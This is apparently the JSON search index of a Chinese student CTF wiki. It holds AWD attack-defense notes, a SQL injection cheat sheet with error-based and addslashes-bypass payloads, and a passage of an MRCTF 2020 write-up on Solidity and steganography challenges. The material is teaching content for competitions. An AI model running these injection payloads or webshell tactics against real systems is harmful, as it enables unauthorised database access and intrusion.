{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Merak Wiki Writeup \u7528\u4e8e\u540c\u5b66\u5206\u4eab\u8be6\u7ec6\u7248Writeup \u77e5\u8bc6\u5e93 \u7528\u4e8e\u540c\u5b66\u5206\u4eab\u76f8\u5173\u77e5\u8bc6","title":"Merak Wiki"},{"location":"#merak-wiki","text":"","title":"Merak Wiki"},{"location":"#writeup","text":"\u7528\u4e8e\u540c\u5b66\u5206\u4eab\u8be6\u7ec6\u7248Writeup","title":"Writeup"},{"location":"#_1","text":"\u7528\u4e8e\u540c\u5b66\u5206\u4eab\u76f8\u5173\u77e5\u8bc6","title":"\u77e5\u8bc6\u5e93"},{"location":"knowledge/crypto/\u53e4\u5178\u52a0\u5bc6/","text":"","title":"\u53e4\u5178\u52a0\u5bc6"},{"location":"knowledge/misc/\u6d41\u91cf\u5206\u6790/","text":"","title":"\u6d41\u91cf\u5206\u6790"},{"location":"knowledge/pwn/overflow/","text":"","title":"Overflow"},{"location":"knowledge/re/SMC/","text":"SMC","title":"SMC"},{"location":"knowledge/re/SMC/#smc","text":"","title":"SMC"},{"location":"knowledge/web/awd_web/","text":"\u8d5b\u524d\u51c6\u5907 \u914d\u8def\u7531\u8868 https://blog.csdn.net/SJU_x1u_q1n9/article/details/81637000 route delete 0.0.0.0 route add \u6bd4\u8d5b\u7f51\u5740ip mask 255.255.255.0 \u5185\u7f51 route add 0.0.0.0 mask 0.0.0.0 \u5916\u7f51 \u6bd4\u8d5b\u5f00\u59cb ssh\u8fde\u63a5 \u8fde\u4e0a\u4e4b\u540e\u9996\u5148\u5907\u4efd\u4e00\u4e0b\u7f51\u9875\u7684\u6e90\u7801(\u53ef\u4ee5\u51c6\u5907\u81ea\u52a8\u5316\u7684\u811a\u672c),windows\u4e0b\u53ef\u4ee5\u4f7f\u7528xshell,\u8fde\u4e0a\u4e4b\u540e\u53ef\u4ee5\u4f7f\u7528xftp\u8fdb\u884c\u6587\u4ef6\u7684\u4f20\u8f93. D\u76fe\u67e5webshell \u6709shell\u9a6c\u4e0a\u5220\u4e86,\u63a5\u7740\u8981\u5c3d\u5feb\u7684\u9a91\u4e0a\u53bb(\u51c6\u5907\u9a91\u9a6c\u811a\u672c) \u4fee\u6539ssh\u5bc6\u7801 \u5982\u679c\u662f\u5f31\u5bc6\u7801\u7684\u8bdd\u8981\u6539 passwd \u6570\u636e\u5e93\u5907\u4efd \u770b\u60c5\u51b5\u8fdb\u884c\u6570\u636e\u5e93\u7684\u5907\u4efd,\u5176\u4e2ddatabase_name\u4ee5\u53ca\u8d26\u53f7\u5bc6\u7801\u8981\u81ea\u5df1\u5728\u6e90\u7801\u91cc\u9762\u627e mysqldump -u root -p database_name > bakup.sql; \u6d41\u91cf\u76d1\u63a7 \u4e0awaf find ./ -type f -name '*.php' |xargs sed -i '1i<?php include_once \"/tmp/waf.php\";?>' \u64a4\u9500 find ./ -type f -name '*.php' |xargs sed -i '1d' \u901a\u8fc7\u67e5\u770b\u6d41\u91cf\u76d1\u63a7\u4ea7\u751f\u7684\u65e5\u5fd7\u53ef\u4ee5\u770b\u5230\u5176\u4ed6\u961f\u4f0d\u53d1\u9001\u7684\u8bf7\u6c42,\u627e\u5230\u5f97\u5206\u7684\u8bf7\u6c42\u5e76\u4e14\u8fc5\u901f\u6a21\u4eff. \u6587\u4ef6\u76d1\u63a7 \u4e0a\u6587\u4ef6\u76d1\u63a7 \u627e\u6d1e\u5199\u811a\u672c \u53ef\u4ee5\u7528postman\u751f\u6210python\u4ee3\u7801","title":"Awd web"},{"location":"knowledge/web/awd_web/#_1","text":"","title":"\u8d5b\u524d\u51c6\u5907"},{"location":"knowledge/web/awd_web/#_2","text":"https://blog.csdn.net/SJU_x1u_q1n9/article/details/81637000 route delete 0.0.0.0 route add \u6bd4\u8d5b\u7f51\u5740ip mask 255.255.255.0 \u5185\u7f51 route add 0.0.0.0 mask 0.0.0.0 \u5916\u7f51","title":"\u914d\u8def\u7531\u8868"},{"location":"knowledge/web/awd_web/#_3","text":"","title":"\u6bd4\u8d5b\u5f00\u59cb"},{"location":"knowledge/web/awd_web/#ssh","text":"\u8fde\u4e0a\u4e4b\u540e\u9996\u5148\u5907\u4efd\u4e00\u4e0b\u7f51\u9875\u7684\u6e90\u7801(\u53ef\u4ee5\u51c6\u5907\u81ea\u52a8\u5316\u7684\u811a\u672c),windows\u4e0b\u53ef\u4ee5\u4f7f\u7528xshell,\u8fde\u4e0a\u4e4b\u540e\u53ef\u4ee5\u4f7f\u7528xftp\u8fdb\u884c\u6587\u4ef6\u7684\u4f20\u8f93.","title":"ssh\u8fde\u63a5"},{"location":"knowledge/web/awd_web/#dwebshell","text":"\u6709shell\u9a6c\u4e0a\u5220\u4e86,\u63a5\u7740\u8981\u5c3d\u5feb\u7684\u9a91\u4e0a\u53bb(\u51c6\u5907\u9a91\u9a6c\u811a\u672c)","title":"D\u76fe\u67e5webshell"},{"location":"knowledge/web/awd_web/#ssh_1","text":"\u5982\u679c\u662f\u5f31\u5bc6\u7801\u7684\u8bdd\u8981\u6539 passwd","title":"\u4fee\u6539ssh\u5bc6\u7801"},{"location":"knowledge/web/awd_web/#_4","text":"\u770b\u60c5\u51b5\u8fdb\u884c\u6570\u636e\u5e93\u7684\u5907\u4efd,\u5176\u4e2ddatabase_name\u4ee5\u53ca\u8d26\u53f7\u5bc6\u7801\u8981\u81ea\u5df1\u5728\u6e90\u7801\u91cc\u9762\u627e mysqldump -u root -p database_name > bakup.sql;","title":"\u6570\u636e\u5e93\u5907\u4efd"},{"location":"knowledge/web/awd_web/#_5","text":"\u4e0awaf find ./ -type f -name '*.php' |xargs sed -i '1i<?php include_once \"/tmp/waf.php\";?>' \u64a4\u9500 find ./ -type f -name '*.php' |xargs sed -i '1d' \u901a\u8fc7\u67e5\u770b\u6d41\u91cf\u76d1\u63a7\u4ea7\u751f\u7684\u65e5\u5fd7\u53ef\u4ee5\u770b\u5230\u5176\u4ed6\u961f\u4f0d\u53d1\u9001\u7684\u8bf7\u6c42,\u627e\u5230\u5f97\u5206\u7684\u8bf7\u6c42\u5e76\u4e14\u8fc5\u901f\u6a21\u4eff.","title":"\u6d41\u91cf\u76d1\u63a7"},{"location":"knowledge/web/awd_web/#_6","text":"\u4e0a\u6587\u4ef6\u76d1\u63a7","title":"\u6587\u4ef6\u76d1\u63a7"},{"location":"knowledge/web/awd_web/#_7","text":"\u53ef\u4ee5\u7528postman\u751f\u6210python\u4ee3\u7801","title":"\u627e\u6d1e\u5199\u811a\u672c"},{"location":"knowledge/web/injection/","text":"SQL\u6ce8\u5165 \u7206\u6570\u636e information_schema information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217column_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u5217\u7684\u540d\u5b57 \u7206\u6570\u636e\u5e93 database() SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA; \u7206\u8868 SELECT group_concat(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = '\u6570\u636e\u5e93\u540d\u79f0'; \u7206\u5b57\u6bb5 SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = '\u8868\u540d\u79f0'; insert \u6ce8\u5165 \u8003\u5bdfinsert\u8bed\u6cd5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503cn) \u82e5\u503ci\u53ef\u4ee5\u63a7\u5236,\u4e0d\u59a8\u6784\u9020\u5982\u4e0bsql\u8bed\u53e5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503ci,...,\u503cn),(\u503c1,...,\u503ci-1,(\u9700\u8981\u7684sql\u8bed\u53e5),\u503ci+1,...,\u503cn) \u9519\u8bef\u6ce8\u5165\u603b\u7ed3 1. and (select 1 from (select count(*),concat((*******),floor(rand(0)*2))x from information_schema.tables group by x)a); \u65e0\u957f\u5ea6\u9650\u5236 2. and (extractvalue(1,concat(1,(****)))); \u53ea\u80fd32\u4f4d 3. and (updatexml(1,concat(0x7e,(****),0x7e),1)); mysql >5.1.5 4. and exp(~(select * from(****)a)); mysql>5.5.5 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7ed5\u8fc7addslashes \u5982\u679c\u6211\u4eec\u80fd\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u62fc\u63a5 %\u2018 or 1=1# \uff0c\u8fdb\u5165\u670d\u52a1\u5668\u540eaddslashes\u7ed3\u679c\u53d8\u6210 %\\' or 1=1# \uff0c\u518d\u62fc\u63a5\u5165\u5f85\u683c\u5f0f\u5316\u7684sql\u8bed\u53e5\uff1a SELECT username, password FROM users where username='%\\' or 1=1#' \u56e0\u4e3a %\\ \u4e0d\u662f\u4efb\u4f55\u4e00\u79cd\u8f93\u51fa\u7c7b\u578b\uff0c\u683c\u5f0f\u5316\u540e\u5f97\u5230\uff1a SELECT username, password FROM users where username='' or 1=1#' \u6210\u529f\u9003\u9038\u4f46\u662f\u53ef\u80fd\u4f1a\u51fa\u73b0php\u62a5\u9519\uff1a PHP Warning: sprintf(): Too few arguments \u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684payload: %1$' \u4e0d\u4f1a\u5f15\u8d77\u76f8\u5173\u62a5\u9519 \u5bbd\u5b57\u8282\u6ce8\u5165\u7ed5\u8fc7addslashes ' \u8f6c\u4e49\u4e4b\u540e \u53d8\u4e3a \\' ,\u82e5 %df%27 \u8f6c\u4e49\u6210 %df%5c%27 = \u904b' \u5f15\u53f7\u9003\u9038 \u7ed5\u8fc7information_schema \u8fc7\u6ee4\u4e86 or \u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7 information_schema \u5e93\u6765\u67e5\u8be2\u8868\u540d\uff0c\u7136\u800c\u5176\u5b9e MySQL 5.7 \u4e4b\u540e\u7684\u7248\u672c\uff0c\u5728\u5176\u81ea\u5e26\u7684 mysql \u5e93\u4e2d\uff0c\u65b0\u589e\u4e86 innodb_table_stats \u548c innodb_index_stats \u8fd9\u4e24\u5f20\u65e5\u5fd7\u8868\u3002\u5982\u679c\u6570\u636e\u8868\u7684\u5f15\u64ce\u662f innodb \uff0c\u5219\u4f1a\u5728\u8fd9\u4e24\u5f20\u8868\u4e2d\u8bb0\u5f55\u8868\u3001\u952e\u7684\u4fe1\u606f \u3002","title":"Injection"},{"location":"knowledge/web/injection/#sql","text":"","title":"SQL\u6ce8\u5165"},{"location":"knowledge/web/injection/#_1","text":"","title":"\u7206\u6570\u636e"},{"location":"knowledge/web/injection/#information_schema","text":"information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217column_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u5217\u7684\u540d\u5b57","title":"information_schema"},{"location":"knowledge/web/injection/#_2","text":"database() SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA;","title":"\u7206\u6570\u636e\u5e93"},{"location":"knowledge/web/injection/#_3","text":"SELECT group_concat(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = '\u6570\u636e\u5e93\u540d\u79f0';","title":"\u7206\u8868"},{"location":"knowledge/web/injection/#_4","text":"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = '\u8868\u540d\u79f0';","title":"\u7206\u5b57\u6bb5"},{"location":"knowledge/web/injection/#insert","text":"\u8003\u5bdfinsert\u8bed\u6cd5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503cn) \u82e5\u503ci\u53ef\u4ee5\u63a7\u5236,\u4e0d\u59a8\u6784\u9020\u5982\u4e0bsql\u8bed\u53e5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503ci,...,\u503cn),(\u503c1,...,\u503ci-1,(\u9700\u8981\u7684sql\u8bed\u53e5),\u503ci+1,...,\u503cn)","title":"insert \u6ce8\u5165"},{"location":"knowledge/web/injection/#_5","text":"1. and (select 1 from (select count(*),concat((*******),floor(rand(0)*2))x from information_schema.tables group by x)a); \u65e0\u957f\u5ea6\u9650\u5236 2. and (extractvalue(1,concat(1,(****)))); \u53ea\u80fd32\u4f4d 3. and (updatexml(1,concat(0x7e,(****),0x7e),1)); mysql >5.1.5 4. and exp(~(select * from(****)a)); mysql>5.5.5","title":"\u9519\u8bef\u6ce8\u5165\u603b\u7ed3"},{"location":"knowledge/web/injection/#addslashes","text":"\u5982\u679c\u6211\u4eec\u80fd\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u62fc\u63a5 %\u2018 or 1=1# \uff0c\u8fdb\u5165\u670d\u52a1\u5668\u540eaddslashes\u7ed3\u679c\u53d8\u6210 %\\' or 1=1# \uff0c\u518d\u62fc\u63a5\u5165\u5f85\u683c\u5f0f\u5316\u7684sql\u8bed\u53e5\uff1a SELECT username, password FROM users where username='%\\' or 1=1#' \u56e0\u4e3a %\\ \u4e0d\u662f\u4efb\u4f55\u4e00\u79cd\u8f93\u51fa\u7c7b\u578b\uff0c\u683c\u5f0f\u5316\u540e\u5f97\u5230\uff1a SELECT username, password FROM users where username='' or 1=1#' \u6210\u529f\u9003\u9038\u4f46\u662f\u53ef\u80fd\u4f1a\u51fa\u73b0php\u62a5\u9519\uff1a PHP Warning: sprintf(): Too few arguments \u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684payload: %1$' \u4e0d\u4f1a\u5f15\u8d77\u76f8\u5173\u62a5\u9519","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7ed5\u8fc7addslashes"},{"location":"knowledge/web/injection/#addslashes_1","text":"' \u8f6c\u4e49\u4e4b\u540e \u53d8\u4e3a \\' ,\u82e5 %df%27 \u8f6c\u4e49\u6210 %df%5c%27 = \u904b' \u5f15\u53f7\u9003\u9038","title":"\u5bbd\u5b57\u8282\u6ce8\u5165\u7ed5\u8fc7addslashes"},{"location":"knowledge/web/injection/#information_schema_1","text":"\u8fc7\u6ee4\u4e86 or \u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7 information_schema \u5e93\u6765\u67e5\u8be2\u8868\u540d\uff0c\u7136\u800c\u5176\u5b9e MySQL 5.7 \u4e4b\u540e\u7684\u7248\u672c\uff0c\u5728\u5176\u81ea\u5e26\u7684 mysql \u5e93\u4e2d\uff0c\u65b0\u589e\u4e86 innodb_table_stats \u548c innodb_index_stats \u8fd9\u4e24\u5f20\u65e5\u5fd7\u8868\u3002\u5982\u679c\u6570\u636e\u8868\u7684\u5f15\u64ce\u662f innodb \uff0c\u5219\u4f1a\u5728\u8fd9\u4e24\u5f20\u8868\u4e2d\u8bb0\u5f55\u8868\u3001\u952e\u7684\u4fe1\u606f \u3002","title":"\u7ed5\u8fc7information_schema"},{"location":"writeup/MRCTF-2020/","text":"MRCTF\u65b0\u751f\u8d5b 2020 Blockchains SimpleReveal \u672c\u9898\u4e3b\u8981\u8003\u5bdf\u5bf9 solidity \u548c web3 \u7684\u5e94\u7528\u3002 \u89e3\u6cd5\u4e00 pragma solidity>=0.4.22; contract reveal { private string flag=\"some_string_here\"; } \u6839\u636e\u539f\u5408\u7ea6\uff0c\u53ef\u4ee5\u770b\u5230 flag \u5e94\u8be5\u5728\u5408\u7ea6\u7684\u524d\u51e0\u4e2a\u53d8\u91cf\u69fd\u4e2d\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 web3.eth.getStorageAt(\"\u5408\u7ea6\u5730\u5740\", 0) \u83b7\u53d6\u5b58\u50a8\u7684\u53d8\u91cf\uff0c\u4ece\u800c\u89e3\u7801\u5f97\u5230flag\u3002 \u89e3\u6cd5\u4e8c Etherscan \u4e0a\u53ef\u4ee5\u770b\u5230\u521b\u5efa\u5408\u7ea6\u4fe1\u606f\uff0c\u5176\u4e2d\u53ef\u4ee5\u770b\u5230 flag \u3002 Unwanted Coin pragma solidity >=0.6.1; contract Modcoin { mapping(uint256 => bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,\"Not Wanted value\"); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } } \u539f\u5408\u7ea6\u4e2d\u4e24\u4e2a\u652f\u4ed8\u51fd\u6570 recvpay() \u548c fallback() \u90fd\u53ea\u5141\u8bb8\u63a5\u53d7\u5076\u6570\u500d0.001 ether\u7684\u4ed8\u6b3e\uff0c\u800c\u5408\u7ea6\u7684getflag\u51fd\u6570\u5219\u8981\u6c42\u5947\u6570\u500d 0.001 ether \u7684\u5408\u7ea6\u4f59\u989d\u624d\u53ef\u4ee5\u6267\u884c\uff08\u5e76\u6e05\u7a7a\u5408\u7ea6\u4f59\u989d\uff09\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u7ed5\u8fc7\u9650\u5236\u5411\u5408\u7ea6\u5730\u5740\u53d1\u9001ether\uff0c\u800c\u5408\u7ea6\u81ea\u6bc1\u6216\u6316\u77ff\u4ea7\u751f\u7684ether\u662f\u65e0\u6cd5\u62d2\u7edd\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u81ea\u6bc1\u5408\u7ea6\u8fbe\u5230\u6761\u4ef6\u3002 contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); } } Misc Hello\uff0cmisc_world\uff01 \u9644\u4ef6\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1kNc2oD5AkfJuzuCPL_qY5w \u63d0\u53d6\u7801\uff1am4ly \u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20\u7ea2\u84dd\u56fe\u548c\u4e00\u4e2a\u52a0\u5bc6\u7684rar\u5305\uff0cbinwalk\u5206\u79bb\u56fe\u7247\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u52a0\u5bc6\u7684zip\u5305 + \u7b2c\u4e00\u79cd\u89e3\u6cd5\uff08\u5176\u5b9e\u662f\u4ffa\u7684\u9884\u671f\u89e3\uff0c\u4f46\u662f\u5e08\u5085\u4eec\u7ed9\u4e86\u66f4\u7b80\u5355\u7684\u89e3\u6cd5\uff0c\u53ef\u89c1\u89e3\u6cd5\u4e8c\uff09 \u6839\u636e\u56fe\u7247\u6240\u7ed9\u540d\u79f0\uff0c\u53ef\u4ee5\u5224\u65ad\u56fe\u4e2d\u9690\u85cf\u4e86\u4fe1\u606f\uff0c\u7531\u4e8e\u56fe\u7247\u4e2d\u53ea\u6709\u7ea2\u8272\u548c\u84dd\u8272\uff0c\u6545\u53ef\u4ee5\u60f3\u5230\u5c06\u56fe\u7247\u4e2d\u7684\u7ea2\u8272\u548c\u84dd\u8272\u50cf\u7d20\u5757\u8f6c\u6362\u6210 0 & 1 \u5e8f\u5217\u5e76\u91cd\u65b0\u6784\u5efa\uff0c\u4ee5\u6b64\u53ef\u4ee5\u8fd8\u539f\u5f97\u5230\u4e00\u5f20\u56fe\u7247\uff1a \u751f\u6210\u811a\u672c\uff1a ```python from PIL import Image import bitstring with open('1.png','rb') as f: bitcon = bitstring.Bits(f) im = Image.new('RGB',(1024,780),(255,0,0)) pim = im.load() for i,val in enumerate(bitcon.bin): if val == '0': pim[i%1024,i/1024] = (0,0,255) im.save('red_blue.png') ``` \u89e3\u9898\u811a\u672c\uff1a ```python from PIL import Image import bitstring im = Image.open('try to restore it.png') width = im.size[0] height = im.size[1] pim = im.load() # \u8bfb\u53d6\u56fe\u7247\u7684\u50cf\u7d20\u4fe1\u606f bin_result = '' for h in range(height): for w in range(width): if pim[w,h][0] == 255: # \u5224\u65ad\u662f\u5426\u662f\u7ea2\u8272\uff08R,G,B\uff09[0]\u8868\u793a\u7b2c\u4e00\u901a\u9053 bin_result += '1' else: bin_result += '0' print bitstring.BitArray(bin=bin_result).bytes.encode('hex') with open('result.png','wb') as f: f.write(bitstring.BitArray(bin=bin_result).bytes) ``` \u6ce8\uff1a\u7531\u4e8e\u521a\u5f00\u59cb\u65e0\u6cd5\u786e\u5b9a\u957f\u5bbd\u7684\u5185\u5916\u5faa\u73af\u5173\u7cfb\u53ca\u7ea2\u84dd\u5bf9\u5e94\u5173\u7cfb\uff0c\u6545\u53ef\u4ee5\u8fdb\u884c\u591a\u6b21\u5c1d\u8bd5 \u8fd8\u539f\u5f97\u5230\u56fe\u7247\uff0c\u770b\u56fe\u83b7\u5f97\u89e3\u538bzip\u5305\u7684\u5bc6\u7801\uff1a + \u7b2c\u4e8c\u79cd\u89e3\u6cd5 \u7528 stegsolve \u67e5\u770b\u56fe\u7247\uff0c Save Bin \u53ef\u76f4\u63a5\u5f97\u5230\u56fe\u7247\uff1a \u89e3\u5f00\u538b\u7f29\u5305\u540e\u5f97\u5230\u4e00\u4e2a\u6587\u6863\uff0c\u6587\u6863\u4e2d\u4fe1\u606f\uff1a 127 255 63 191 127 191 63 127 127 255 63 191 63 191 255 127 ... \u89c2\u5bdf\u53ef\u77e5\u6587\u6863\u4e2d\u53ea\u542b\u6709 127 255 63 191 \u8fd9\u56db\u4e2a\u6570\u5b57\uff0c\u5c06\u8fd9\u56db\u4e2a\u6570\u5b57\u8f6c\u5316\u4e3a\u4e8c\u8fdb\u5236\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u56db\u4e2a\u6570\u5b57\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e2d \u53ea\u6709\u6700\u9ad8\u4e24\u4f4d\u7684\u4e8c\u8fdb\u5236\u6570\u4e0d\u540c \uff0c\u5c06\u5176\u6700\u9ad8\u4e24\u4f4d\u63d0\u53d6\u51fa\u6765\u7ec4\u5408\u5728\u4e00\u8d77\u8f6c\u5316\u4e3aASCII\uff0c\u53ef\u4ee5\u5f97\u5230rar\u5bc6\u7801\uff1a fp = open('out.txt','r') a = fp.readlines() p = [] for i in a: p.append(int(i)) s = '' for i in p: if i == 63: a = '00' elif i == 127: a = '01' elif i == 191: a = '10' elif i == 255: a = '11' s += a import binascii result = '' for i in range(0,len(s),8): result += chr(int(s[i:i+8],2)) print result \u5f97\u5230rar\u5305\u7684\u89e3\u538b\u5bc6\u7801\uff1a 0ac1fe6b77be5dbe \u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2azip\u5305\uff0c\u770bzip\u5305\u91cc\u7684\u5185\u5bb9\u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a docx \u6587\u4ef6\uff0c\u6539\u540e\u7f00\u4e3adocx\u5f97\u5230\u6700\u7ec8\u7684\u6587\u4ef6 \u5c06\u6587\u4ef6\u5185\u5bb9\u5168\u9009\u6539\u4e3a\u6df1\u8272\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u6587\u6863\u7684\u6700\u4e0b\u65b9\u85cf\u6709\u51e0\u4e32\u5b57\u7b26 ps\uff1a\u5982\u679c\u7528word\u6253\u5f00\u7684\u8bdd\u53ef\u4ee5\u770b\u5230\u6709\u6700\u540e\u7684\u6362\u884c\u7b26\u5b58\u5728\uff0c\u53ef\u4ee5\u5224\u65ad\u6587\u6863\u4e2d\u9690\u85cf\u4e86\u5185\u5bb9 \u5c06\u6bcf\u4e00\u957f\u4e32\u7684\u5b57\u7b26\u7528base64\u89e3\u7801\uff0c\u53ef\u4ee5\u5f97\u52306\u884c\u53ea\u7531 0 & 1 \u7ec4\u6210\u7684\u5b57\u7b26\u4e32 \u5728\u6587\u6863\u5de6\u4fa7\uff08word\u548cWPS\u90fd\u53ef\uff09\u67e5\u627e\u5b57\u7b26\u5c31\u53ef\u4ee5\u89c2\u5bdf\u5230flag\uff0c\u5305\u88f9\u4e0a MRCTF{} \u5c31\u662f\u6700\u7ec8\u7684flag flag: MRCTF{He1Lo_mi5c~} ISS SSTV\u6162\u626b\u63cf\u7535\u89c6\u3002 \u65e0\u7ebf\u7535\uff0c\u76f4\u63a5\u7528MMSSTV\u5c31\u80fd\u89e3\u7801\u4e86\u3002 \u8bfb\u51fa\u56fe\u7247\u53d6\u5f97flag\u3002 \u4e0d\u7720\u4e4b\u591c \u8fd9\u662f\u4e00\u4e2a\u4e0d\u80fd\u900f\u9732\u51fa\u9898\u4eba\u4fe1\u606f\u7684\u9898\u76ee... \u89e3\u6cd51\uff1a\u624b\u52a8\u62fc\u56fe\uff08\u9003 \u89e3\u6cd52\uff1a\u5199\u811a\u672c\u62fc\u56fe\u3002\u901a\u8fc7\u4e00\u4e9b\u65b9\u6cd5\uff08\u6bd4\u5982\u8fb9\u7f18\u7684\u5bf9\u5e94\u50cf\u7d20\u8272\u5dee\u53d6\u5e73\u65b9\u548c\uff09\u8ba1\u7b97\u8fb9\u7f18\u7684\u76f8\u4f3c\u5ea6\uff0c\u5bf9\u6bcf\u4e2a\u56fe\u7247\u5bf9\u8c61dfs\u5176\u56db\u5468\u6700\u76f8\u4f3c\u7684\u56fe\u7247\u5373\u53ef\uff0c\u590d\u6742\u5ea6(n^3)\uff0c2000\u591a\u50cf\u7d20\uff0c\u5e38\u6570\u4e0d\u5927\uff0c\u53ef\u4ee5\u8dd1\u3002 \u5728\u4f7f\u7528PIL\u62fc\u56fe\u7684\u65f6\u5019\u6ce8\u610f\u751f\u6210\u539f\u56fe\u957f\u5bbd\u4e8c\u500d\u7684\u56fe\u7247\uff0c\u4ece\u4e2d\u95f4\u4e00\u70b9\u5f00\u59cb\u6269\u5c55\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u4e0d\u4f1a\u8d8a\u754c\u3002\u6216\u8005\u68c0\u6d4b\u7ea2\u8272\u50cf\u7d20\u70b9\u4f4d\u7f6e\uff0c\u636e\u6b64\u6784\u9020\u8fb9\u7f18\u7279\u5f81\u4e5f\u53ef\u4ee5\uff0c\u4f46\u8fd9\u6837\u5bb9\u6613\u51fa\u73b0\u591a\u4e2a\u5f3a\u8fde\u901a\u5206\u91cf\u7684\u60c5\u51b5\uff0c\u6700\u540e\u8fd8\u8981\u624b\u52a8\u62fc \uff08\u7b97\u6cd5dalao\u8bf7\u52a1\u5fc5\u628a\u811a\u672c\u53d1\u6765\u770b\u770b \u89e3\u6cd53\uff1agayhub\u4e0a\u7684gaps\u5de5\u5177\u3002\u8c37\u6b4c\u641c\u7d22jigsaw solver\u53ef\u4ee5\u627e\u5230\u8fd9\u4e2a\u5de5\u5177\uff0c\u4e24\u79d2\u5c31\u8dd1\u51fa\u6765\u4e86\u3002 \u6ce8\u610f\u5176\u53c2\u6570 -size \u4ee3\u8868\u4e86\u5206\u5272\u6210\u6b63\u65b9\u5f62\u5757\u7684\u8fb9\u957f\u3002\u663e\u7136\u5e94\u8be5\u53d6\u5c0f\u62fc\u56fe\u7684\u957f\u5bbd\u6700\u5927\u516c\u56e0\u6570100 Unravel \u9996\u5148\u62ff\u5230\u540ebinwalk\u5206\u79bb\u56fe\u7247\u53d1\u73b0\u5e26\u6709aes\u7684Tokyo \u7136\u540e\u67e5\u770b.wav\u6587\u4ef6\u5c3e\uff0c\u53d1\u73b0\u5bc6\u6587\u3002 \u5229\u7528\u5bc6\u7801\u89e3\u5bc6\u7684\u5f97\u5230\u53e6\u4e00\u4e2a.wav \u901a\u8fc7silenteye\u89e3LSB\u9690\u5199 \u5f97\u5230flag\u3002 \u98de\u6765\u6a2a\u8d22 pragma solidity >=0.6.1; contract Modcoin { mapping(uint256 => bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,\"Not Wanted value\"); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } } \u539f\u5408\u7ea6\u4e2d\u4e24\u4e2a\u652f\u4ed8\u51fd\u6570 recvpay() \u548c fallback() 